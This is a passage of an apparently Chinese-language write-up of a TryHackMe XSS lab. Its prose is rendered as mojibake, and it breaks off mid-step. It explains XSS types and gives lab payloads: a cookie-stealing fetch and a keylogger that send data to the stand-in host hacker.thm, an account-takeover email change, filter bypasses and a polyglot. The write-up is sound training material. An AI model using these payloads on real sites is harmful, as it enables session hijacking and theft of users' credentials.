<p>åˆ©ç”¨ä¸€æ®µç®€å•çš„ä»£ç ï¼ŒéªŒè¯å’Œæ£€æµ‹æ¼æ´çš„å­˜åœ¨ï¼Œè¿™æ ·çš„ä»£ç å«åšPOCï¼ˆProof Of
Conceptçš„ç¼©å†™ï¼‰ã€‚</p>
<p>è¿™æ˜¯æœ€ç®€å•çš„
payloadï¼Œé€šå¸¸æ˜¯é€šè¿‡åœ¨webé¡µé¢ä¸Šå¼¹å‡ºå¸¦æœ‰æ–‡æœ¬çš„è­¦å‘Šæ¡†æ¥å®ç°çš„ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="title function_">alert</span>(<span class="string">'XSS'</span>); &lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="session-stealingsessionä¼šè¯çªƒå–">Session
Stealingï¼ˆsessionä¼šè¯çªƒå–ï¼‰</h3>
<p>ç”¨æˆ·ä¼šè¯çš„è¯¦ç»†ä¿¡æ¯ï¼ˆä¾‹å¦‚ç™»å½•tokenï¼‰é€šå¸¸ä¿å­˜åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šçš„ cookie
ä¸­ã€‚ä¸‹é¢çš„JavaScriptä»£ç è·å–ç›®æ ‡è®¡ç®—æœºçš„ cookie åï¼Œä½¿ç”¨ base64
å¯¹å…¶è¿›è¡Œç¼–ç ä»¥ä¿è¯æˆåŠŸä¼ è¾“ï¼Œç„¶åå°†å…¶å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ä¸Šä»¥ä¾¿è®°å½•ã€‚ä¸€æ—¦æ”»å‡»è€…æ‹¥æœ‰è¿™äº›
cookieï¼Œä»–ä»¬å°±å¯ä»¥æ¥ç®¡ç›®æ ‡çš„ä¼šè¯å¹¶ä½œä¸ºç›®æ ‡ç”¨æˆ·ç™»å½•ã€‚</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/steal?cookie='</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="key-loggeré”®ç›˜è®°å½•">Key Loggerï¼ˆé”®ç›˜è®°å½•ï¼‰</h3>
<p>ä¸‹é¢çš„ä»£ç å……å½“äº†é”®ç›˜è®°å½•å™¨ï¼Œæ„å‘³ç€ç›®æ ‡åœ¨ç½‘é¡µä¸Šé”®å…¥çš„ä»»ä½•å†…å®¹éƒ½å°†è¢«å‘é€åˆ°é»‘å®¢æ§åˆ¶çš„ç½‘ç«™ã€‚å¦‚æœå°†è¯¥ç±»å‹çš„
payload
è¢«æ”¾ç½®åœ¨ç›®æ ‡ç½‘ç«™ä¸Šç”¨äºæ¥æ”¶ç”¨æˆ·ç™»å½•æˆ–ä¿¡ç”¨å¡è¯¦ç»†ä¿¡æ¯ï¼Œè¿™å¯èƒ½ä¼šé€ æˆå¾ˆå¤§çš„æŸå¤±ã€‚</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) { <span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/log?key='</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );}&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="business-logicä¸šåŠ¡é€»è¾‘">Business Logicï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰</h3>
<p>è¿™ä¸ªç±»å‹çš„ payload ä¼šè°ƒç”¨ç‰¹å®šçš„ç½‘ç»œèµ„æºæˆ– JavaScript
å‡½æ•°ï¼Œä¾‹å¦‚ä¸€ä¸ªç”¨äºæ›´æ”¹ç”¨æˆ·ç”µå­é‚®ä»¶çš„ JavaScript
å‡½æ•°<code>user.changeEmail()</code>ï¼Œpayload å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.<span class="title function_">changeEmail</span>(<span class="string">'attacker@hacker.thm'</span>);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>ç°åœ¨ï¼Œç›®æ ‡é‚®ä»¶åœ°å€å·²è¢«æ›´æ”¹ï¼Œæ”»å‡»è€…å¯ä»¥é‡ç½®å¯†ç ï¼Œå®ç°æ”»å‡»ã€‚</p>
<h2 id="types-of-xss">Types Of XSS</h2>
<h3 id="reflected-xssåå°„å‹xss">Reflected XSSï¼ˆåå°„å‹XSSï¼‰</h3>
<p>å½“ç”¨æˆ·åœ¨HTTPè¯·æ±‚ä¸­æä¾›çš„æ•°æ®æœªç»ä»»ä½•éªŒè¯å°±åŒ…å«åœ¨ç½‘é¡µæºä¸­æ—¶ï¼Œå°±ä¼šå‘ç”Ÿåå°„å‹XSSã€‚</p>
<ul>
<li><p>ç¤ºä¾‹ï¼š</p>
<p>ä¸€ä¸ªç½‘ç«™ï¼Œå¦‚æœè¾“å…¥ä¸ç¬¦åˆè§„èŒƒçš„å­—ç¬¦ä¸²ï¼Œå°±ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œè€Œé”™è¯¯ä¿¡æ¯çš„å†…å®¹æ˜¯ä»æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery
stringï¼‰ä¸­çš„ <strong>error</strong>
å‚æ•°è·å–çš„ï¼Œå¹¶ç›´æ¥æ„å»ºåˆ°é¡µé¢æºä¸­ã€‚</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002430576.png" alt="image-20230110002430576">
<figcaption aria-hidden="true">image-20230110002430576</figcaption>
</figure>
<p>åº”ç”¨ç¨‹åºä¸æ£€æŸ¥ <strong>error</strong>
å‚æ•°ä¸­çš„å†…å®¹ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥æ’å…¥æ¶æ„ä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002600690.png" alt="image-20230110002600690">
<figcaption aria-hidden="true">image-20230110002600690</figcaption>
</figure></li>
<li><p>æ½œåœ¨å½±å“ï¼š</p>
<p>æ”»å‡»è€…å¯ä»¥åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šå‘é€é“¾æ¥æˆ–å°†å…¶åµŒå…¥å¦ä¸€ä¸ªåŒ…å«JavaScript
payloadçš„ç½‘ç«™ä¸Šçš„ <strong>iframe</strong> ä¸­(iframeæ˜¯åµŒå…¥å¼æ¡†æ¶,
æ˜¯htmlæ ‡ç­¾,
ç”¨æ¥åœ¨é¡µé¢åµŒå…¥å…¶ä»–é¡µé¢)ï¼Œä½¿å¾—å—å®³è€…åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œä»£ç ï¼Œä»è€Œè·å–ç”¨æˆ·ä¼šè¯å’Œä¿¡æ¯ã€‚</p></li>
<li><p>å¦‚ä½•æµ‹è¯•åå°„å‹XSSï¼š</p>
<p>åˆ‡å…¥ç‚¹åŒ…æ‹¬ï¼š</p>
<ol type="1">
<li>URL query string ä¸­çš„å‚æ•°</li>
<li>URL æ–‡ä»¶è·¯å¾„</li>
<li>HTTP å¤´éƒ¨ä¿¡æ¯</li>
</ol></li>
</ul>
<h3 id="stored-xsså­˜å‚¨å‹xss">Stored XSSï¼ˆå­˜å‚¨å‹XSSï¼‰</h3>
<p>é¡¾åæ€ä¹‰ï¼Œå­˜å‚¨å‹XSSçš„ payload
å­˜å‚¨åœ¨webåº”ç”¨ç¨‹åºä¸Š(ä¾‹å¦‚æ•°æ®åº“)ï¼Œç„¶ååœ¨å…¶ä»–ç”¨æˆ·è®¿é—®ç«™ç‚¹æˆ–ç½‘é¡µæ—¶è¿è¡Œã€‚</p>
<ul>
<li><p>ç¤ºä¾‹ï¼š</p>
<p>ä¸€ä¸ªå…è®¸ç”¨æˆ·å‘å¸ƒè¯„è®ºçš„åšå®¢ç½‘ç«™ï¼Œä½†æ˜¯è¯¥ç½‘ç«™å¹¶æ²¡æœ‰å¯¹è¯„è®ºè¿›è¡Œè¿‡æ»¤æ£€æŸ¥ï¼Œå› æ­¤å¯èƒ½åŒ…å«æ¶æ„ä»£ç ã€‚å¦‚æœæˆ‘ä»¬ç°åœ¨å‘å¸ƒåŒ…å«JavaScriptä»£ç çš„è¯„è®ºï¼Œåˆ™ä¼šè¢«å­˜å‚¨åœ¨æ•°æ®åº“ï¼Œå› æ­¤å½“å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥æ–‡ç« æ—¶å°†ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œè¯¥JavaScriptä»£ç ã€‚</p></li>
<li><p>æ½œåœ¨å½±å“ï¼š</p>
<p>æ¶æ„çš„JavaScriptä»£ç å¯ä»¥å°†ç”¨æˆ·é‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ï¼Œçªƒå–ç”¨æˆ·çš„ä¼šè¯
cookie æˆ–æ˜¯å†’å……å½“å‰ç”¨æˆ·æ‰§è¡Œå…¶ä»–æ“ä½œã€‚</p></li>
<li><p>å¦‚ä½•æµ‹è¯•å­˜å‚¨å‹XSSï¼š</p>
<p>ä½ éœ€è¦æµ‹è¯•æ¯ä¸ªå¯èƒ½å­˜å‚¨æ•°æ®çš„å…¥å£ç‚¹ï¼Œå¹¶å°†æ¶æ„ä»£ç æ˜¾ç¤ºåœ¨å…¶ä»–ç”¨æˆ·å¯ä»¥çœ‹åˆ°çš„åœ°æ–¹ï¼Œä¾‹å¦‚ï¼š</p>
<ol type="1">
<li>åšå®¢ä¸Šçš„è¯„è®º</li>
<li>ç”¨æˆ·çš„ä¸ªäººèµ„æ–™ä¿¡æ¯</li>
<li>ç½‘ç«™åˆ—è¡¨</li>
</ol>
<p>æœ‰æ—¶å¼€å‘äººå‘˜è®¤ä¸ºåœ¨å®¢æˆ·ç«¯ä¸Šé™åˆ¶ç”¨æˆ·çš„è¾“å…¥å€¼æ˜¯ä¸€ä¸ªå¥½çš„ä¿æŠ¤æ–¹æ¡ˆï¼Œå› æ­¤å°†è¾“å…¥å€¼æ›´æ”¹ä¸ºwebåº”ç”¨ç¨‹åºä¸æœŸæœ›çš„å€¼å¯èƒ½ä¼šå‘ç°å­˜å‚¨å‹XSSã€‚ä¾‹å¦‚ï¼Œå¼€å‘äººå‘˜æœŸæœ›ç”¨æˆ·é€šè¿‡ä¸‹æ‹‰èœå•é€‰æ‹©ä¸€ä¸ªæ•´æ•°ä½œä¸º
<strong>age</strong>
çš„å€¼ï¼Œè€Œæˆ‘ä»¬å¯ä»¥å°è¯•æ‰‹åŠ¨å‘é€è¯·æ±‚ï¼Œä»¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p></li>
</ul>
<h3 id="dom-based-xssdomå‹xss">DOM Based XSSï¼ˆDOMå‹XSSï¼‰</h3>
<ul>
<li><p>DOMæ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>DOMå³æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆ<strong>D</strong>ocument <strong>O</strong>bject
<strong>M</strong>odelï¼‰ï¼Œæ˜¯ HTML å’Œ XML æ–‡æ¡£çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£
(API)ï¼Œå®ƒä»£è¡¨ä¸€ä¸ªé¡µé¢ï¼Œä»¥ä¾¿ç¨‹åºå¯æ›´æ”¹æ–‡æ¡£ç»“æ„ã€æ ·å¼å’Œå†…å®¹ã€‚ç½‘é¡µæ˜¯ä¸€ä¸ªæ–‡æ¡£ï¼Œæ”¹æ–‡æ¡£å¯ä»¥åœ¨æµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºæˆ–ä½œä¸º
HTML æºæ˜¾ç¤ºã€‚ä¸‹é¢æ˜¯å…³äº HTML DOM çš„å›¾ï¼š</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110111213075.png" alt="image-20230110111213075">
<figcaption aria-hidden="true">image-20230110111213075</figcaption>
</figure></li>
<li><p>Exploiting the DOM</p>
<p>DOMå‹XSSèƒ½å¤Ÿä½¿å¾—JavaScriptä»£ç ç›´æ¥åœ¨æµè§ˆå™¨ä¸Šæ‰§è¡Œï¼Œæ— éœ€åŠ è½½ä»»ä½•æ–°é¡µé¢æˆ–æ˜¯æäº¤æ•°æ®ç»™åç«¯ä»£ç ã€‚å½“ç½‘ç«™ä¸Šçš„JavaScriptä»£ç ç”¨ä½œè¾“å…¥æˆ–ä¸ç”¨æˆ·äº¤äº’ä½œç”¨æ—¶ï¼Œåˆ™ä¼šæ‰§è¡Œè¯¥ä»£ç ã€‚</p></li>
<li><p>ç¤ºä¾‹ï¼š</p>
<p>å‡è®¾ä¸€ä¸ªç½‘ç«™çš„JavaScriptä»£ç ä»<code>window.location.hash</code>å‚æ•°ä¸­è·å–å†…å®¹ï¼Œç„¶åå°†å…¶å†™å…¥å½“å‰æ­£åœ¨æŸ¥çœ‹çš„é¡µé¢ä¸­ã€‚å¦‚æœæ²¡æœ‰æ£€æŸ¥å“ˆå¸Œçš„å†…å®¹æ˜¯å¦å«æœ‰æ¶æ„ä»£ç ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥å°†JavaScriptä»£ç æ³¨å…¥å½“å‰ç½‘é¡µä¸­ã€‚</p></li>
<li><p>æ½œåœ¨å½±å“ï¼š</p>
<p>æ”»å‡»è€…å°†ç²¾å¿ƒè®¾è®¡çš„é“¾æ¥å‘é€ç»™å—å®³è€…ï¼Œå°†ä»–ä»¬é‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ï¼Œæˆ–ä»å½“å‰é¡µé¢ã€ç”¨æˆ·ä¼šè¯çªƒå–å†…å®¹ã€‚</p></li>
<li><p>å¦‚ä½•æµ‹è¯• DOMå‹ XSSï¼š</p>
<p>æµ‹è¯•DOMå‹ XSS æ˜¯å¾ˆæœ‰æŒ‘æˆ˜æ€§çš„ï¼Œéœ€è¦å¤§é‡çš„ JavaScript
çŸ¥è¯†å»é˜…è¯»æºä»£ç ã€‚ä½ éœ€è¦æŸ¥æ‰¾æ”»å‡»è€…å¯ä»¥æ§è®¿é—®å¹¶ä¸”æ§åˆ¶çš„å˜é‡
çš„ä»£ç éƒ¨åˆ†ï¼Œä¾‹å¦‚ <strong>window.location.x</strong> å‚æ•°ã€‚</p>
<p>å½“ä½ æ‰¾åˆ°è¿™äº›ä»£ç åï¼Œä½ éœ€è¦æŸ¥çœ‹å®ƒä»¬æ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œä»¥åŠè¿™äº›å€¼æ˜¯å¦è¢«å†™å…¥ç½‘é¡µçš„
DOM ä¸­æˆ–æ˜¯ä¼ é€’ç»™ä¸å®‰å…¨çš„ JavaScript æ–¹æ³•(methods)ï¼Œä¾‹å¦‚
<strong>eval()</strong> ã€‚</p></li>
</ul>
<h3 id="blind-xss">Blind XSS</h3>
<p>Blind XSS ç±»ä¼¼äºå­˜å‚¨å‹XSSã€‚æ”»å‡»è€…çš„ payload
å­˜å‚¨åœ¨ç½‘ç«™ä¸Šï¼Œä¾›å…¶ä»–ç”¨æˆ·æŸ¥çœ‹ï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…æ— æ³•çœ‹åˆ° payload
çš„å·¥ä½œæƒ…å†µï¼Œä¹Ÿè‡ªè¡Œæ— æ³•æµ‹è¯•å®ƒã€‚</p>
<ul>
<li><p>ç¤ºä¾‹ï¼š</p>
<p>å‡è®¾ç½‘ç«™ä¸Šæœ‰ä¸€ä¸ªè”ç³»è¡¨å•ï¼Œä½ å¯ä»¥é€šè¿‡è¯¥è¡¨å•è”ç³»ç›¸å…³æˆå‘˜ï¼Œæ¶ˆæ¯å†…å®¹ä¸ä¼šè¢«è¿‡æ»¤å’Œæ£€æŸ¥ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥è¾“å…¥ä»–ä»¬æƒ³è¦çš„ä»»ä½•å†…å®¹ï¼Œç„¶åè¿™äº›æ¶ˆæ¯è¢«è½¬æ¢ä¸ºæ”¯æŒç¥¨ï¼Œå‘˜å·¥ä»¬å¯ä»¥åœ¨ç§æœ‰ç½‘ç«™ä¸ŠæŸ¥çœ‹ï¼Œä»è€Œè§¦å‘
XSS æ”»å‡»ã€‚</p></li>
<li><p>æ½œåœ¨å½±å“ï¼š</p>
<p>æ”»å‡»è€…ä½¿ç”¨å¯¹åº”çš„payloadå¯ä»¥å°†å‘˜å·¥é—¨æˆ· URL
ã€å‘˜å·¥çš„cookieä¿¡æ¯ç”šè‡³æ­£åœ¨æŸ¥çœ‹çš„é¡µé¢å†…å®¹å›è°ƒç»™æ”»å‡»è€…çš„ç½‘ç«™ã€‚æ¥ç€ï¼Œæ”»å‡»è€…å¯èƒ½åŠ«æŒå·¥ä½œäººå‘˜çš„ä¼šè¯å¹¶è®¿é—®ç§æœ‰é—¨æˆ·ã€‚</p></li>
<li><p>å¦‚ä½•æµ‹è¯• Blind XSS</p>
<p>åœ¨æµ‹è¯• blind XSS æ¼æ´æ—¶ï¼Œä½ éœ€è¦ç¡®ä¿payloadæœ‰å›è°ƒ(é€šå¸¸æ˜¯ HTTP
è¯·æ±‚)ï¼Œè¿™æ ·ä½ å°±èƒ½çŸ¥é“ä»£ç æ˜¯å¦ä»¥åŠä½•æ—¶è¢«æ‰§è¡Œã€‚</p>
<p>å¯¹äº blind XSS æ¼æ´ï¼Œå¸¸ç”¨çš„å·¥å…·æ˜¯ <a target="_blank" rel="noopener" href="https://xsshunter.com/">XSShunter</a> ã€‚ä½ å¯ä»¥ç”¨ JavaScript
åˆ¶ä½œè‡ªå·±çš„å·¥å…·ï¼Œä½†è¯¥å·¥å…·ä¼šè‡ªåŠ¨æ•è·cookieã€URLã€é¡µé¢å†…å®¹ç­‰ã€‚</p></li>
</ul>
<h2 id="å®éªŒ">å®éªŒ</h2>
<h3 id="level-one">Level One</h3>
<p>åœ¨è¾“å…¥æ¡†ä¸­éšä¾¿è¾“å…¥ä¸€ä¸²å­—ç¬¦æŸ¥çœ‹ç»“æœï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220357722.png" alt="image-20230110220357722">
<figcaption aria-hidden="true">image-20230110220357722</figcaption>
</figure>
<p>å³é”®æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°ç›¸å…³ä»£ç ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, hxt<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>å›åˆ°åˆå§‹é¡µé¢ï¼Œç›´æ¥å°è¯•è¾“å…¥ payload
ï¼š<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>ï¼ŒæˆåŠŸæ˜¾ç¤ºå¼¹çª—ã€‚</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220703361.png" alt="image-20230110220703361">
<figcaption aria-hidden="true">image-20230110220703361</figcaption>
</figure>
<h3 id="level-two">Level Two</h3>
<p>å°è¯•è¾“å…¥ä¸Šä¸€å…³çš„ payload ï¼Œå‘ç°å¤±è´¥ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert('THM');&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>å‘ç°è¾“å…¥çš„å­—ç¬¦è¢«åµŒå…¥åˆ°äº†<code>input</code> æ ‡ç­¾
ä¸­ï¼Œäºæ˜¯åº”è¯¥å°è¯•é—­åˆè¯¥æ ‡ç­¾
ï¼Œç„¶åå†è¿è¡Œ<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>ã€‚æ‰€ä»¥æœ€ç»ˆçš„
payload
ä¸º<strong><code>"&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code></strong>ã€‚</p>
<h3 id="level-three">Level Three</h3>
<p>è¾“å…¥<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>ï¼Œç‚¹å‡»<code>Enter</code>åï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>å‘ç°ä»£ç è¢«åµŒå…¥åˆ°äº†<code>textarea</code> æ ‡ç­¾ ä¸­ï¼Œç±»ä¼¼äº level two
ï¼Œéœ€è¦å°†<code>textarea</code>é—­åˆï¼Œå› æ­¤ payload
ä¸ºï¼š<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>ã€‚</p>
<h3 id="level-four">Level Four</h3>
<p>æ­¥éª¤å¦‚ä¸Šï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementsByClassName('name')[0].innerHTML='<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>ä¹Ÿæ˜¯éœ€è¦è¿›è¡Œé—­åˆå¤„ç†ï¼Œpayload
ä¸ºï¼š<code>';alert('THM');//</code>ã€‚</p>
<h3 id="level-five">Level Five</h3>
<p>è¾“å…¥ä»£ç åï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;&gt;</span>alert('THM');<span class="tag">&lt;/&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>å‘ç°<code>script</code>è¢«è¿‡æ»¤æ‰äº†ï¼Œå› æ­¤ payload
ä¸ºï¼š<code>&lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt;</code>ã€‚</p>
<h3 id="level-six">Level Six</h3>
<p>è¾“å…¥æ¡†æœ‰é»˜è®¤çš„å­—ç¬¦ä¸²ï¼Œç‚¹å‡»<code>Enter</code>æŒ‰é’®åå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110225019628.png" alt="image-20230110225019628" style="zoom:67%;"></p>
<p>æºä»£ç ä¸ºï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/images/cat.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>å°è¯• level two çš„ payload ï¼Œå˜åŒ–åçš„æºä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span><span class="attr">scriptalert</span>('<span class="attr">THM</span>');/<span class="attr">script</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>å‘ç°<code>&lt;</code>ã€<code>&gt;</code>è¿™ä¸¤ä¸ªç¬¦å·è¢«è¿‡æ»¤äº†ï¼Œä¸ºäº†ç»•è¿‡è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>img</code>æ ‡ç­¾çš„å…¶ä»–å±æ€§ï¼Œä¾‹å¦‚<code>onload</code>äº‹ä»¶ï¼Œä¸€æ—¦<code>src</code>å±æ€§ä¸­æŒ‡å®šçš„å›¾åƒåŠ è½½åˆ°ç½‘é¡µä¸Šï¼Œè¯¥äº‹ä»¶å°†æ‰§è¡ŒæŒ‡å®šçš„ä»£ç ã€‚å› æ­¤
payload ä¸ºï¼š<code>/images/cat.jpg" onload="alert('THM');</code>ã€‚</p>
<p>å¾—åˆ°flagï¼š<code>THM{XSS_MASTER}</code>ã€‚</p>
<h3 id="polyglots">Polyglots</h3>
<p>XSS polyglot æ˜¯ä¸€ä¸²æ–‡æœ¬ï¼Œç®—æ˜¯é€šç”¨ payload
ï¼Œå¯ä»¥é—­åˆå±æ€§ã€é—­åˆæ ‡ç­¾ä»¥åŠç»•è¿‡è¿‡æ»¤å™¨ã€‚
ä½ å¯ä»¥åœ¨åˆšåˆšå®Œæˆçš„å…­ä¸ªå…³å¡ä¸­ä½¿ç”¨ä»¥ä¸‹ payloadï¼Œå¹¶ä¸”éƒ½ä¼šæˆåŠŸæ‰§è¡Œã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</span><br></pre></td></tr></tbody></table></figure>
<h3 id="blind-xss-1">Blind XSS</h3>
<p>åœ¨ç›®æ ‡ç½‘ç«™ä¸Šåˆ›å»ºæ–°ç”¨æˆ·ï¼Œç„¶ååœ¨ <strong>Support Tickets</strong>
é€‰é¡¹å¹¶åˆ›å»ºæ–°çš„ <strong>Ticket</strong> ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110232709300.png" alt="image-20230110232709300">
<figcaption aria-hidden="true">image-20230110232709300</figcaption>
</figure>
<p>ç„¶åç‚¹å‡»è¯¥ ticket çš„ id å·è·³è½¬åˆ° ticket
